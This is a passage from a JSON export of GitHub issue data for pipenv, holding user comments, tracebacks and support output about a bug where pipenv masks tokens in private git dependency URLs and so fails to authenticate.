`3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3.6m`\r\n  - `3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3`\r\n  - `3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3.6`\r\n  - `3.6.9`: `/usr/bin/python3.6`\r\n  - `3.6.9`: `/usr/bin/python3.6m`\r\n  - `3.6.9`: `/usr/bin/python3`\r\n  - `2.7.17`: `/usr/bin/python2`\r\n  - `2.7.17`: `/usr/bin/python2.7`\r\n\r\nPEP 508 Information:\r\n\r\n```\r\n{'implementation_name': 'cpython',\r\n 'implementation_version': '3.6.10',\r\n 'os_name': 'posix',\r\n 'platform_machine': 'x86_64',\r\n 'platform_python_implementation': 'CPython',\r\n 'platform_release': '5.3.0-51-generic',\r\n 'platform_system': 'Linux',\r\n 'platform_version': '#44~18.04.2-Ubuntu SMP Thu Apr 23 14:27:18 UTC 2020',\r\n 'python_full_version': '3.6.10',\r\n 'python_version': '3.6',\r\n 'sys_platform': 'linux'}\r\n```\r\n\r\nSystem environment variables:\r\n\r\n  - `CLUTTER_IM_MODULE`\r\n  - `LS_COLORS`\r\n  - `LC_MEASUREMENT`\r\n  - `LC_PAPER`\r\n  - `LC_MONETARY`\r\n  - `XDG_MENU_PREFIX`\r\n  - `LANG`\r\n  - `LESS`\r\n  - `DISPLAY`\r\n  - `PYENV_ROOT`\r\n  - `OLDPWD`\r\n  - `GNOME_SHELL_SESSION_MODE`\r\n  - `MAVEN_HOME`\r\n  - `COLORTERM`\r\n  - `DESKTOP_AUTOSTART_ID`\r\n  - `PYENV_VIRTUALENV_INIT`\r\n  - `USERNAME`\r\n  - `JAVA_HOME`\r\n  - `PYENV_HOOK_PATH`\r\n  - `XDG_VTNR`\r\n  - `ZSH`\r\n  - `SSH_AUTH_SOCK`\r\n  - `MANDATORY_PATH`\r\n  - `LC_NAME`\r\n  - `XDG_SESSION_ID`\r\n  - `USER`\r\n  - `PYENV_DIR`\r\n  - `PAGER`\r\n  - `LSCOLORS`\r\n  - `DESKTOP_SESSION`\r\n  - `QT4_IM_MODULE`\r\n  - `TEXTDOMAINDIR`\r\n  - `GNOME_TERMINAL_SCREEN`\r\n  - `DEFAULTS_PATH`\r\n  - `PWD`\r\n  - `HOME`\r\n  - `TEXTDOMAIN`\r\n  - `SSH_AGENT_PID`\r\n  - `PYENV_VERSION`\r\n  - `QT_ACCESSIBILITY`\r\n  - `XDG_SESSION_TYPE`\r\n  - `XDG_DATA_DIRS`\r\n  - `XDG_SESSION_DESKTOP`\r\n  - `LC_ADDRESS`\r\n  - `LC_NUMERIC`\r\n  - `GTK_MODULES`\r\n  - `PAPERSIZE`\r\n  - `WINDOWPATH`\r\n  - `VTE_VERSION`\r\n  - `TERM`\r\n  - `SHELL`\r\n  - `QT_IM_MODULE`\r\n  - `XMODIFIERS`\r\n  - `IM_CONFIG_PHASE`\r\n  - `XDG_CURRENT_DESKTOP`\r\n  - `GPG_AGENT_INFO`\r\n  - `GNOME_TERMINAL_SERVICE`\r\n  - `PYENV_SHELL`\r\n  - `XDG_SEAT`\r\n  - `SHLVL`\r\n  - `LANGUAGE`\r\n  - `LC_TELEPHONE`\r\n  - `GDMSESSION`\r\n  - `GNOME_DESKTOP_SESSION_ID`\r\n  - `LOGNAME`\r\n  - `DBUS_SESSION_BUS_ADDRESS`\r\n  - `XDG_RUNTIME_DIR`\r\n  - `XAUTHORITY`\r\n  - `XDG_CONFIG_DIRS`\r\n  - `PATH`\r\n  - `LC_IDENTIFICATION`\r\n  - `SESSION_MANAGER`\r\n  - `GTK_IM_MODULE`\r\n  - `LC_TIME`\r\n  - `PIP_DISABLE_PIP_VERSION_CHECK`\r\n  - `PYTHONDONTWRITEBYTECODE`\r\n  - `PIP_SHIMS_BASE_MODULE`\r\n  - `PIP_PYTHON_PATH`\r\n  - `PYTHONFINDER_IGNORE_UNSUPPORTED`\r\n\r\nPipenv–specific environment variables:\r\n\r\n\r\nDebug–specific environment variables:\r\n\r\n  - `PATH`: `/home/lukas/.pyenv/versions/3.6.10/bin:/home/lukas/.pyenv/libexec:/home/lukas/.pyenv/plugins/python-build/bin:/home/lukas/.pyenv/plugins/pyenv-virtualenv/bin:/home/lukas/.pyenv/plugins/pyenv-update/bin:/home/lukas/.pyenv/plugins/pyenv-installer/bin:/home/lukas/.pyenv/plugins/pyenv-doctor/bin:/usr/lib/jvm/adoptopenjdk-8-openj9-amd64/bin:/usr/lib/maven/apache-maven-3.6.3/bin:/home/lukas/.pyenv/plugins/pyenv-virtualenv/shims:/home/lukas/.pyenv/shims:/home/lukas/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/lukas/.fzf/bin`\r\n  - `SHELL`: `/usr/bin/zsh`\r\n  - `LANG`: `ko_KR.UTF-8`\r\n  - `PWD`: `/home/lukas/pipenv-test`\r\n\r\n\r\n---------------------------\r\n\r\nContents of `Pipfile` ('/home/lukas/pipenv-test/Pipfile'):\r\n\r\n```toml\r\n[[source]]\r\nname = \"pypi\"\r\nurl = \"https://pypi.org/simple\"\r\nverify_ssl = true\r\n\r\n[dev-packages]\r\n\r\n[packages]\r\nmyprivate = {editable = true, git = \"https://****@github.com/skyoo2003/myprivate.git\", ref = \"v1.0.0\"}\r\n\r\n[requires]\r\npython_version = \"3.6\"\r\n\r\n```\r\n\r\n</details>",
                "comments": [
                    {
                        "body": "Can you verify that you actually can `git clone https://${GITHUB_TOKEN}@github.com/skyoo2003/myprivate.git` using the same environment variable? I have just now confirmed that environment variables do get translated from `requirements.txt` files.\r\n\r\n",
                        "user": "techalchemy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-05-15T00:00:20Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-628947618"
                    },
                    {
                        "body": "@techalchemy \r\n\r\nAfter setting the environment variable GITHUB_TOKEN, git clone command worked successfully.\r\n\r\n```sh\r\n$ export GITHUB_TOKEN=\"{My Github personal access token}\"\r\n$ LC_ALL=en_us.UTF-8 git clone \"https://${GITHUB_TOKEN}@github.com/skyoo2003/myprivate.git\"\r\nCloning into 'myprivate'...\r\nremote: Enumerating objects: 7, done.\r\nremote: Counting objects: 100% (7/7), done.\r\nremote: Compressing objects: 100% (5/5), done.\r\nremote: Total 7 (delta 0), reused 7 (delta 0), pack-reused 0\r\nUnpacking objects: 100% (7/7), done.\r\n```\r\n\r\nHowever, after setting the environment variable, I retried the command \"pipenv install -r requirements.txt --verbose\" and failed for the same reason.\r\n\r\n```sh\r\n$ export GITHUB_TOKEN=\"{My Github personal access token}\"\r\n$ pipenv install -r requirements.txt --verbose\r\nRequirements file provided! Importing into Pipfile…\r\nPipfile.lock not found, creating…\r\nLocking [dev-packages] dependencies…\r\nLocking [packages] dependencies…\r\nBuilding requirements...\r\nResolving dependencies...\r\n⠴ Locking...\r\n⠧ Locking...\r\n⠙ Locking...\r\n⠸ Locking...ERROR:pip.subprocessor:Command errored out with exit status 128:\r\n command: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-44kpmqn3-src/myprivate\r\n     cwd: None\r\nComplete output (2 lines):\r\nremote: Invalid username or password.\r\nfatal: Authentication failed for 'https://****@github.com/skyoo2003/myprivate.git/'\r\n----------------------------------------\r\n✘ Locking Failed! \r\nTraceback (most recent call last):\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 807, in <module>\r\n    main()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 803, in main\r\n    parsed.requirements_dir, parsed.packages, parse_only=parsed.parse_only)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 785, in _main\r\n    resolve_packages(pre, clear, verbose, system, write, requirements_dir, packages)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 753, in resolve_packages\r\n    requirements_dir=requirements_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 736, in resolve\r\n    req_dir=requirements_dir\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1379, in resolve_deps\r\n    req_dir=req_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1084, in actually_resolve_deps\r\n    deps, index_lookup, markers_lookup, project, sources, req_dir, clear, pre\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 649, in create\r\n    pre=pre, clear=clear\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 463, in get_metadata\r\n    req, resolver=transient_resolver\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 540, in get_deps_from_req\r\n    req_list, lockfile = get_vcs_deps(reqs=[req])\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1867, in get_vcs_deps\r\n    with temp_path(), locked_repository(requirement) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 2029, in locked_repository\r\n    with requirement.req.locked_vcs_repo(src_dir=src_dir) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2141, in locked_vcs_repo\r\n    vcsrepo = self.get_vcs_repo(src_dir=src_dir)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2097, in get_vcs_repo\r\n    vcsrepo.obtain()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/vcs.py\", line 77, in obtain\r\n    self.repo_backend.obtain(self.checkout_directory, self.parsed_url)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 527, in obtain\r\n    self.fetch_new(dest, url, rev_options)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/git.py\", line 225, in fetch_new\r\n    self.run_command(make_command('clone', '-q', url, dest))\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 667, in run_command\r\n    log_failed_cmd=log_failed_cmd)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/utils/subprocess.py\", line 242, in call_subprocess\r\n    raise InstallationError(exc_msg)\r\npipenv.patched.notpip._internal.exceptions.InstallationError: Command errored out with exit status 128: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-44kpmqn3-src/myprivate Check the logs for full command output.\r\nERROR:pip.subprocessor:Command errored out with exit status 128:\r\n command: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-44kpmqn3-src/myprivate\r\n     cwd: None\r\nComplete output (2 lines):\r\nremote: Invalid username or password.\r\nfatal: Authentication failed for 'https://****@github.com/skyoo2003/myprivate.git/'\r\n----------------------------------------\r\nTraceback (most recent call last):\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 807, in <module>\r\n    main()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 803, in main\r\n    parsed.requirements_dir, parsed.packages, parse_only=parsed.parse_only)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 785, in _main\r\n    resolve_packages(pre, clear, verbose, system, write, requirements_dir, packages)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 753, in resolve_packages\r\n    requirements_dir=requirements_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 736, in resolve\r\n    req_dir=requirements_dir\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1379, in resolve_deps\r\n    req_dir=req_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1084, in actually_resolve_deps\r\n    deps, index_lookup, markers_lookup, project, sources, req_dir, clear, pre\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 649, in create\r\n    pre=pre, clear=clear\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 463, in get_metadata\r\n    req, resolver=transient_resolver\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 540, in get_deps_from_req\r\n    req_list, lockfile = get_vcs_deps(reqs=[req])\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1867, in get_vcs_deps\r\n    with temp_path(), locked_repository(requirement) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 2029, in locked_repository\r\n    with requirement.req.locked_vcs_repo(src_dir=src_dir) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2141, in locked_vcs_repo\r\n    vcsrepo = self.get_vcs_repo(src_dir=src_dir)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2097, in get_vcs_repo\r\n    vcsrepo.obtain()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/vcs.py\", line 77, in obtain\r\n    self.repo_backend.obtain(self.checkout_directory, self.parsed_url)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 527, in obtain\r\n    self.fetch_new(dest, url, rev_options)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/git.py\", line 225, in fetch_new\r\n    self.run_command(make_command('clone', '-q', url, dest))\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 667, in run_command\r\n    log_failed_cmd=log_failed_cmd)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/utils/subprocess.py\", line 242, in call_subprocess\r\n    raise InstallationError(exc_msg)\r\npipenv.patched.notpip._internal.exceptions.InstallationError: Command errored out with exit status 128: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-44kpmqn3-src/myprivate Check the logs for full command output.\r\n```\r\n\r\n<details><summary>$ pipenv --support</summary>\r\n\r\nPipenv version: `'2020.4.1b1'`\r\n\r\nPipenv location: `'/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv'`\r\n\r\nPython location: `'/home/lukas/.pyenv/versions/3.6.10/bin/python3.6'`\r\n\r\nPython installations found:\r\n\r\n  - `3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3.6`\r\n  - `3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3.6m`\r\n  - `3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3`\r\n  - `3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3.6`\r\n  - `3.6.9`: `/usr/bin/python3.6`\r\n  - `3.6.9`: `/usr/bin/python3.6m`\r\n  - `3.6.9`: `/usr/bin/python3`\r\n  - `2.7.17`: `/usr/bin/python2`\r\n  - `2.7.17`: `/usr/bin/python2.7`\r\n\r\nPEP 508 Information:\r\n\r\n```\r\n{'implementation_name': 'cpython',\r\n 'implementation_version': '3.6.10',\r\n 'os_name': 'posix',\r\n 'platform_machine': 'x86_64',\r\n 'platform_python_implementation': 'CPython',\r\n 'platform_release': '5.3.0-51-generic',\r\n 'platform_system': 'Linux',\r\n 'platform_version': '#44~18.04.2-Ubuntu SMP Thu Apr 23 14:27:18 UTC 2020',\r\n 'python_full_version': '3.6.10',\r\n 'python_version': '3.6',\r\n 'sys_platform': 'linux'}\r\n```\r\n\r\nSystem environment variables:\r\n\r\n  - `CLUTTER_IM_MODULE`\r\n  - `LS_COLORS`\r\n  - `LC_MEASUREMENT`\r\n  - `LC_PAPER`\r\n  - `LC_MONETARY`\r\n  - `XDG_MENU_PREFIX`\r\n  - `LANG`\r\n  - `LESS`\r\n  - `DISPLAY`\r\n  - `PYENV_ROOT`\r\n  - `OLDPWD`\r\n  - `GNOME_SHELL_SESSION_MODE`\r\n  - `MAVEN_HOME`\r\n  - `COLORTERM`\r\n  - `DESKTOP_AUTOSTART_ID`\r\n  - `PYENV_VIRTUALENV_INIT`\r\n  - `USERNAME`\r\n  - `JAVA_HOME`\r\n  - `PYENV_HOOK_PATH`\r\n  - `XDG_VTNR`\r\n  - `ZSH`\r\n  - `SSH_AUTH_SOCK`\r\n  - `MANDATORY_PATH`\r\n  - `LC_NAME`\r\n  - `XDG_SESSION_ID`\r\n  - `USER`\r\n  - `PYENV_DIR`\r\n  - `PAGER`\r\n  - `LSCOLORS`\r\n  - `DESKTOP_SESSION`\r\n  - `QT4_IM_MODULE`\r\n  - `TEXTDOMAINDIR`\r\n  - `GNOME_TERMINAL_SCREEN`\r\n  - `DEFAULTS_PATH`\r\n  - `PWD`\r\n  - `HOME`\r\n  - `TEXTDOMAIN`\r\n  - `SSH_AGENT_PID`\r\n  - `PYENV_VERSION`\r\n  - `QT_ACCESSIBILITY`\r\n  - `XDG_SESSION_TYPE`\r\n  - `XDG_DATA_DIRS`\r\n  - `GITHUB_TOKEN`\r\n  - `XDG_SESSION_DESKTOP`\r\n  - `LC_ADDRESS`\r\n  - `LC_NUMERIC`\r\n  - `GTK_MODULES`\r\n  - `PAPERSIZE`\r\n  - `WINDOWPATH`\r\n  - `VTE_VERSION`\r\n  - `TERM`\r\n  - `SHELL`\r\n  - `QT_IM_MODULE`\r\n  - `XMODIFIERS`\r\n  - `IM_CONFIG_PHASE`\r\n  - `XDG_CURRENT_DESKTOP`\r\n  - `GPG_AGENT_INFO`\r\n  - `GNOME_TERMINAL_SERVICE`\r\n  - `PYENV_SHELL`\r\n  - `XDG_SEAT`\r\n  - `SHLVL`\r\n  - `LANGUAGE`\r\n  - `LC_TELEPHONE`\r\n  - `GDMSESSION`\r\n  - `GNOME_DESKTOP_SESSION_ID`\r\n  - `LOGNAME`\r\n  - `DBUS_SESSION_BUS_ADDRESS`\r\n  - `XDG_RUNTIME_DIR`\r\n  - `XAUTHORITY`\r\n  - `XDG_CONFIG_DIRS`\r\n  - `PATH`\r\n  - `LC_IDENTIFICATION`\r\n  - `SESSION_MANAGER`\r\n  - `GTK_IM_MODULE`\r\n  - `LC_TIME`\r\n  - `PIP_DISABLE_PIP_VERSION_CHECK`\r\n  - `PYTHONDONTWRITEBYTECODE`\r\n  - `PIP_SHIMS_BASE_MODULE`\r\n  - `PIP_PYTHON_PATH`\r\n  - `PYTHONFINDER_IGNORE_UNSUPPORTED`\r\n\r\nPipenv–specific environment variables:\r\n\r\n\r\nDebug–specific environment variables:\r\n\r\n  - `PATH`: `/home/lukas/.pyenv/versions/3.6.10/bin:/home/lukas/.pyenv/libexec:/home/lukas/.pyenv/plugins/python-build/bin:/home/lukas/.pyenv/plugins/pyenv-virtualenv/bin:/home/lukas/.pyenv/plugins/pyenv-update/bin:/home/lukas/.pyenv/plugins/pyenv-installer/bin:/home/lukas/.pyenv/plugins/pyenv-doctor/bin:/usr/lib/jvm/adoptopenjdk-8-openj9-amd64/bin:/usr/lib/maven/apache-maven-3.6.3/bin:/home/lukas/.pyenv/plugins/pyenv-virtualenv/shims:/home/lukas/.pyenv/shims:/home/lukas/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/lukas/.fzf/bin`\r\n  - `SHELL`: `/usr/bin/zsh`\r\n  - `LANG`: `ko_KR.UTF-8`\r\n  - `PWD`: `/home/lukas/pipenv-test`\r\n\r\n\r\n---------------------------\r\n\r\nContents of `Pipfile` ('/home/lukas/pipenv-test/Pipfile'):\r\n\r\n```toml\r\n[[source]]\r\nname = \"pypi\"\r\nurl = \"https://pypi.org/simple\"\r\nverify_ssl = true\r\n\r\n[dev-packages]\r\n\r\n[packages]\r\nmyprivate = {editable = true, git = \"https://****@github.com/skyoo2003/myprivate.git\", ref = \"v1.0.0\"}\r\n\r\n[requires]\r\npython_version = \"3.6\"\r\n\r\n```\r\n\r\n</details>",
                        "user": "skyoo2003",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-05-15T01:38:15Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-628974972"
                    },
                    {
                        "body": "I'm having the same issue when using `git+https://raw_token@github.com/user/package-name.git@branch#egg=package-name`\r\n\r\nThis is from AWS Beanstalk Python 3.7, but also fails on my mac\r\n\r\n```2020/07/17 02:22:27.241041 [ERROR] Creating a Pipfile for this project…\r\nRequirements file provided! Importing into Pipfile…\r\nAn error occurred while installing -e git+https://****@github.com/user/package.git@branch#egg=package! Will try again.\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/cli/command.py\", line 252, in install\r\n[InstallError]:       site_packages=state.site_packages\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 2062, in do_install\r\n[InstallError]:       keep_outdated=keep_outdated\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 1314, in do_init\r\n[InstallError]:       pypi_mirror=pypi_mirror,\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 901, in do_install_dependencies\r\n[InstallError]:       retry_list, procs, failed_deps_queue, requirements_dir, **install_kwargs\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 796, in batch_install\r\n[InstallError]:       _cleanup_procs(procs, failed_deps_queue, retry=retry)\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 703, in _cleanup_procs\r\n[InstallError]:       raise exceptions.InstallError(c.dep.name, extra=err_lines)\r\n[pipenv.exceptions.InstallError]: Obtaining package from git+https://****@github.com/user/package.git@branch#egg=package (from -r /tmp/pipenv-k0wkmnw2-requirements/pipenv-cpaca5jp-requirement.txt (line 1))\r\n[pipenv.exceptions.InstallError]:   Cloning https://****@github.com/user/package.git@branch#egg=package (to revision process-bookings) to /var/app/venv/staging-LQM1lest/src/package\r\n[pipenv.exceptions.InstallError]: Running command git clone -q 'https://****@github.com/user/package.git@branch#egg=package' /var/app/venv/staging-LQM1lest/src/package\r\n[pipenv.exceptions.InstallError]:   fatal: could not read Password for 'https://****@github.com': No such device or address\r\n[pipenv.exceptions.InstallError]: ERROR: Command errored out with exit status 128: git clone -q 'https://****@github.com/user/package.git@branch#egg=package' /var/app/venv/staging-LQM1lest/src/packageCheck the logs for full command output.\r\nERROR: Couldn't install package: package\r\n Package installation failed...\r\n\r\n2020/07/17 02:22:27.241083 [ERROR] An error occurred during execution of command [app-deploy] - [InstallDependency]. Stop running the command. Error: fail to install dependencies with requirements.txt file with error Command /bin/sh -c python3 -m pipenv install -r requirements.txt --skip-lock failed with error exit status 1. Stderr:Creating a Pipfile for this project…\r\nRequirements file provided! Importing into Pipfile…\r\nAn error occurred while installing -e git+https://****@github.com/user/package.git@branch#egg=package! Will try again.\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/cli/command.py\", line 252, in install\r\n[InstallError]:       site_packages=state.site_packages\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 2062, in do_install\r\n[InstallError]:       keep_outdated=keep_outdated\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 1314, in do_init\r\n[InstallError]:       pypi_mirror=pypi_mirror,\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 901, in do_install_dependencies\r\n[InstallError]:       retry_list, procs, failed_deps_queue, requirements_dir, **install_kwargs\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 796, in batch_install\r\n[InstallError]:       _cleanup_procs(procs, failed_deps_queue, retry=retry)\r\n[InstallError]:   File \"/usr/local/lib/python3.7/site-packages/pipenv/core.py\", line 703, in _cleanup_procs\r\n[InstallError]:       raise exceptions.InstallError(c.dep.name, extra=err_lines)\r\n[pipenv.exceptions.InstallError]: Obtaining package from git+https://****@github.com/user/package.git@branch#egg=package (from -r /tmp/pipenv-k0wkmnw2-requirements/pipenv-cpaca5jp-requirement.txt (line 1))\r\n[pipenv.exceptions.InstallError]:   Cloning https://****@github.com/user/package.git@branch#egg=package (to revision process-bookings) to /var/app/venv/staging-LQM1lest/src/package\r\n[pipenv.exceptions.InstallError]: Running command git clone -q 'https://****@github.com/user/package.git@branch#egg=package' /var/app/venv/staging-LQM1lest/src/package\r\n[pipenv.exceptions.InstallError]:   fatal: could not read Password for 'https://****@github.com': No such device or address\r\n[pipenv.exceptions.InstallError]: ERROR: Command errored out with exit status 128: git clone -q 'https://****@github.com/user/package.git@branch#egg=package' /var/app/venv/staging-LQM1lest/src/package\r\nCheck the logs for full command output.\r\nERROR: Couldn't install package: package\r\n Package installation failed...\r\n```\r\n\r\n\r\n\r\nWorks fine with pip, guess it's related to pipenv for some reason.... (first time using pipenv)",
                        "user": "LanceSandino",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-07-17T02:49:40Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-659804187"
                    },
                    {
                        "body": "It also does not work when using basic auth to authenticate to a git provider.\r\n\r\nThe problem seems to be that the command that is run has the sensible parts (token/password) sanitized.\r\n\r\nExample is a line in the requirement file with a repository and an user and password in base auth http form, like\r\n```\r\nhttps://gitlab+deploy-token-123:foobar@gitlab.com/some/project.git#egg=some-egg\r\n```\r\nThe command that is run by subprocess is\r\n```py\r\n['git', 'clone', '-q', 'https://gitlab+deploy-token-123:****@gitlab.com/some/project.git', '/tmp/pipenv-asf23-src/project']\r\n```\r\nthat clearly does not work\r\nThat command line is from this file\r\nhttps://github.com/pypa/pipenv/blob/b29a4884e24dd2dd72f379d64b23779a676d2ef9/pipenv/patched/notpip/_internal/utils/subprocess.py#L186-L191\r\n",
                        "user": "CaselIT",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-07-29T15:37:20Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-665738667"
                    },
                    {
                        "body": "The problem in the example with basic auth seems to be that the args in cmd are sanitized at least twice and `HiddenText.secret` contains an already sanitized string\r\n\r\nhttps://github.com/pypa/pipenv/blob/b29a4884e24dd2dd72f379d64b23779a676d2ef9/pipenv/patched/notpip/_internal/utils/subprocess.py#L65-L72\r\n\r\nEdit: version `2018.11.26` seems to work",
                        "user": "CaselIT",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-07-29T15:43:23Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-665742031"
                    },
                    {
                        "body": "any update on this?",
                        "user": "LanceSandino",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-08-24T22:17:20Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-679394574"
                    },
                    {
                        "body": "Getting same error with \r\n$ pipenv --version\r\npipenv, version 2020.11.15\r\n\r\nExecuting git clone with user cred works. \r\nExecuting pipenv install with env vairable for credentials also doesn't work",
                        "user": "sandeep-tukaram",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-02-05T10:28:17Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-773944917"
                    },
                    {
                        "body": "Can this be checked with the new `pipenv requirements` command which replaced the `pipenv lock -r`?  Version `pipenv==2022.8.19`",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-08-21T12:02:10Z",
                        "url": "https://github.com/pypa/pipenv/issues/4253#issuecomment-1221531784"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pypa/pipenv/pull/4192",
                "title": "Fix issue #3901: environment variables parse in commands",
                "labels": [
                    "Type: Enhancement :bulb:",
                    "Type: Possible Bug",
                    "Type: Discussion",
                    "Priority: Low",
                    "Status: Awaiting Review",
                    "Category: CLI",
                    "Category: Security"
                ],
                "user": "Hammond95",
